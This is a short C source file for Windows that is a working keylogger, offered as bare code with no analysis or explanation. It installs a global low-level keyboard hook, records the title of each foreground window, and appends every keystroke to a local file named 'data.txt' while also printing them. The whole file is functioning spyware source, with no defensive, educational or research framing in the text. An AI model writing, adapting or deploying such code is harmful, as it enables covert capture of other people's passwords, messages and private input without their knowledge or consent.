#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


FILE* fp;
HWND windowHandle;
char currentWindowTitle[256];
char windowTitle[256];


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    BOOL fEatKeystroke = FALSE;

    if (nCode == HC_ACTION) {
        switch (wParam) {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN: {
            // case WM_KEYUP:
            // case WM_SYSKEYUP: {
                windowHandle = GetForegroundWindow();
                GetWindowTextA(windowHandle, currentWindowTitle, 256);

                if (strcmp(currentWindowTitle, windowTitle)) {
                    strcpy(windowTitle, currentWindowTitle);
                    printf("\n\n%s\n", windowTitle);
                    fprintf(fp, "\n\n%s\n", windowTitle);
                }

                PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
                printf("%c", p->vkCode);
                fprintf(fp, "%c", p->vkCode);
                break;
            }
        }
    }

    return fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam);
}


void messageLoop() {
    MSG message;

    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}


DWORD WINAPI TheKeyLogger() {
    HINSTANCE hinstExe = GetModuleHandle(NULL);
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinstExe, 0);

    messageLoop();
    UnhookWindowsHookEx(hhkLowLevelKybd);

    return 0;
}


int main(int argc, char **argv)
{
    HANDLE hThread;
    DWORD dwThread;

    fp = fopen("data.txt", "a+");

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)TheKeyLogger, (LPVOID)argv[0], NULL, &dwThread);

    if (hThread) {
        return WaitForSingleObject(hThread, INFINITE);
    }
    else {
        fclose(fp);
        return 1;
    }
}
